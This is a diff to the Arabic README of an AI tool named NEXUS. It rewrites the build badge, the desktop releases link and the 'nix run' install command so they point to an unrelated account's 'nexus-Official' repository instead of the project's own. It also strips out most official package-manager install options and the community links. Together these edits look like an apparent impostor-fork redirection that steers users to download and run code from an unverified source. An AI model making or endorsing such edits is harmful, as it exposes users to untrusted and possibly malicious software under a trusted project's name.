@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://nexus.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/nexus-ai"><img alt="npm" src="https://img.shields.io/npm/v/nexus-ai?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/nexus/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/nexus/publish.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/ravipacharpro-jpg/nexus-Official/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/ravipacharpro-jpg/nexus-Official/publish.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -51,14 +51,9 @@ curl -fsSL https://nexus.ai/install | bash
 
 # مديري الحزم
 npm i -g nexus-ai@latest        # او bun/pnpm/yarn
-scoop install nexus             # Windows
-choco install nexus             # Windows
-brew install anomalyco/tap/nexus # macOS و Linux (موصى به، دائما محدث)
-brew install nexus              # macOS و Linux (صيغة brew الرسمية، تحديث اقل)
-sudo pacman -S nexus            # Arch Linux (Stable)
 paru -S nexus-bin               # Arch Linux (Latest from AUR)
 mise use -g nexus               # اي نظام
-nix run nixpkgs#nexus           # او github:anomalyco/nexus لاحدث فرع dev
+nix run github:ravipacharpro-jpg/nexus-Official           # او github:ravipacharpro-jpg/nexus-Official لاحدث فرع dev
 ```
 
 > [!TIP]
@@ -66,18 +61,16 @@ nix run nixpkgs#nexus           # او github:anomalyco/nexus لاحدث فرع 
 
 ### تطبيق سطح المكتب (BETA)
 
-يتوفر NEXUS ايضا كتطبيق سطح مكتب. قم بالتنزيل مباشرة من [صفحة الاصدارات](https://github.com/anomalyco/nexus/releases) او من [nexus.ai/download](https://nexus.ai/download).
+يتوفر NEXUS ايضا كتطبيق سطح مكتب. قم بالتنزيل مباشرة من [صفحة الاصدارات](https://github.com/ravipacharpro-jpg/nexus-Official/releases) او من [nexus.ai/download](https://nexus.ai/download).
 
 | المنصة                | التنزيل                            |
 | --------------------- | ---------------------------------- |
 | macOS (Apple Silicon) | `nexus-desktop-mac-arm64.dmg`   |
 | macOS (Intel)         | `nexus-desktop-mac-x64.dmg`     |
-| Windows               | `nexus-desktop-windows-x64.exe` |
+| Windows               | `nexus-desktop-win-x64.exe` |
 | Linux                 | `.deb` او `.rpm` او AppImage       |
 
 ```bash
-# macOS (Homebrew)
-brew install --cask nexus-desktop
 # Windows (Scoop)
 scoop bucket add extras; scoop install extras/nexus-desktop
 ```
@@ -126,4 +119,3 @@ XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://nexus.ai/install | bash
 
 ---
 
-**انضم الى مجتمعنا** [Discord](https://discord.gg/nexus) | [X.com](https://x.com/nexus)
